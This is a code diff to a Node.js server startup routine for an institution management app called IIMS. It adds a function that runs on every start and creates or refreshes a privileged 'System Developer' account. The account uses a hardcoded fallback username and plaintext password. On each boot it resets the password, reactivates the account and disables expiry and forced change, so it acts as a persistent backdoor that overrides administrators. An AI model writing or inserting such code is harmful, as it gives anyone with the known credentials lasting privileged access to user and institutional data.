@@ -63,6 +63,62 @@ async function ensureDefaultInstitutionAndAdmin() {
       [expiresAt, existingAdmin[0].id]
     );
   }
+  return institutionId;
+}
+
+async function ensureSystemDeveloperAccount(defaultInstitutionId) {
+  const username = process.env.SYSTEM_DEVELOPER_USERNAME || "29645654";
+  const password = process.env.SYSTEM_DEVELOPER_PASSWORD || "Sheeza@2015";
+  const passwordHash = await hashPassword(password);
+  const existing = await query(
+    `SELECT id
+     FROM users
+     WHERE username = ?
+     ORDER BY id ASC`,
+    [username]
+  );
+
+  if (!existing.length) {
+    await query(
+      `INSERT INTO users
+        (institution_id, full_name, username, password_hash, password_last_changed_at, password_expires_at, must_change_password, role, email, phone, is_active)
+       VALUES (?, ?, ?, ?, NOW(), NULL, 0, ?, ?, ?, 1)`,
+      [
+        defaultInstitutionId,
+        "System Developer",
+        username,
+        passwordHash,
+        ROLES.SYSTEM_DEVELOPER,
+        "system.developer@iims.local",
+        "+254700000001"
+      ]
+    );
+    // eslint-disable-next-line no-console
+    console.log(`System developer account created: ${username}`);
+    return;
+  }
+
+  await query(
+    `UPDATE users
+     SET institution_id = ?,
+         full_name = ?,
+         password_hash = ?,
+         role = ?,
+         is_active = 1,
+         password_last_changed_at = NOW(),
+         password_expires_at = NULL,
+         must_change_password = 0
+     WHERE username = ?`,
+    [
+      defaultInstitutionId,
+      "System Developer",
+      passwordHash,
+      ROLES.SYSTEM_DEVELOPER,
+      username
+    ]
+  );
+  // eslint-disable-next-line no-console
+  console.log(`System developer account refreshed: ${username}`);
 }
 
 async function ensureUserPasswordPolicyColumns() {
@@ -147,7 +203,8 @@ async function ensureUserPasswordPolicyColumns() {
 async function start() {
   await query("SELECT 1");
   await ensureUserPasswordPolicyColumns();
-  await ensureDefaultInstitutionAndAdmin();
+  const defaultInstitutionId = await ensureDefaultInstitutionAndAdmin();
+  await ensureSystemDeveloperAccount(defaultInstitutionId);
   app.listen(PORT, () => {
     // eslint-disable-next-line no-console
     console.log(`IIMS server running on http://localhost:${PORT}`);
